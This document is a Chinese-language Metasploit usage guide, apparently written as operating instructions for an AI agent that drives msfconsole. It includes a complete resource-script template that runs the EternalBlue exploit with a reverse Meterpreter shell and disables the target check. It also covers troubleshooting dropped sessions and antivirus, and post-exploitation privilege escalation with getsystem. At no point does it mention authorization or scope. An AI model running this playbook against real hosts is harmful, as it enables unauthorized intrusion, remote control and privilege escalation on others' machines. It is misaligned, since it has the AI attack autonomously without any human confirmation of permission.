# Metasploit Best Practices Guide
版本: 1.0

## 1. 简介
Metasploit Framework (MSF) 是渗透测试中最强大的漏洞利用工具。然而，由于其复杂性，自动化调用时容易出错。本指南旨在规范 MSF 的使用流程，提高成功率。

## 2. 模块选择 (Module Selection)
不要盲目尝试。在运行 Exploit 之前，必须进行精确的指纹匹配。

### 错误示范
- ❌ 直接搜索 "apache" 然后随便选一个模块。
- ❌ 对 Linux 目标使用 Windows Exploit。

### 正确流程
1. **确认服务版本**: 例如 "Apache 2.4.49"。
2. **确认操作系统**: 例如 "Ubuntu Linux"。
3. **搜索匹配模块**: `search type:exploit name:apache version:2.4.49`。
4. **检查 Rank**: 优先使用 `Excellent` 或 `Great` 的模块。

## 3. 资源脚本编写规范 (.rc)
AI 必须通过编写 `.rc` 文件来控制 msfconsole。

### 模板
```ruby
# 1. 选择模块
use exploit/windows/smb/ms17_010_eternalblue

# 2. 设置目标 (RHOSTS)
set RHOSTS 192.168.1.10

# 3. 设置本机 (LHOST) - 必须是能被目标访问的 IP
# 注意：不要使用 127.0.0.1，除非你在做本地测试
set LHOST 192.168.1.5
set LPORT 4444

# 4. 选择 Payload
# 推荐优先尝试 generic/shell_reverse_tcp (兼容性好)
# 如果明确是 Windows x64，用 windows/x64/meterpreter/reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 5. 绕过一些检查 (可选)
set AutoCheck false

# 6. 执行攻击
# -j: 后台运行 job
# -z: 不立即交互 (防止卡死)
exploit -j -z

# 7. 等待结果
sleep 15

# 8. 检查会话
sessions -l

# 9. 退出 (防止卡死)
exit -y
```

## 4. 常见错误与解决方案

| 错误信息 | 原因分析 | 解决方案 |
| :--- | :--- | :--- |
| `Exploit failed: The following options failed to validate: RHOSTS` | 未设置 RHOSTS | 检查脚本中是否有 `set RHOSTS ...` |
| `Handler failed to bind to ...` | LPORT 被占用或 LHOST 错误 | 更换 LPORT，确认 LHOST 是本机 IP |
| `Exploit completed, but no session was created` | Payload 不匹配或被防火墙拦截 | 1. 尝试 `generic/shell_reverse_tcp`<br>2. 尝试 `bind_tcp` (如果是内网无法反连)<br>3. 检查 LHOST 是否正确 |
| `Session 1 opened` 但无法交互 | Session 很快死亡 | 目标可能崩溃或有杀软。尝试 migrate 进程或使用 HTTPS Payload |

## 5. 拿到 Session 后的操作
一旦 `sessions -l` 显示有活动会话：

1. **进入会话**: `sessions -i <id>`
2. **信息收集**: `sysinfo`, `getuid`, `ipconfig`
3. **提权 (如果需要)**: `getsystem` 或 `run post/multi/recon/local_exploit_suggester`

---
**记住**: MSF 不是万能的。如果多次尝试失败，请退回到手动漏洞验证 (POC脚本) 或寻找其他攻击路径。
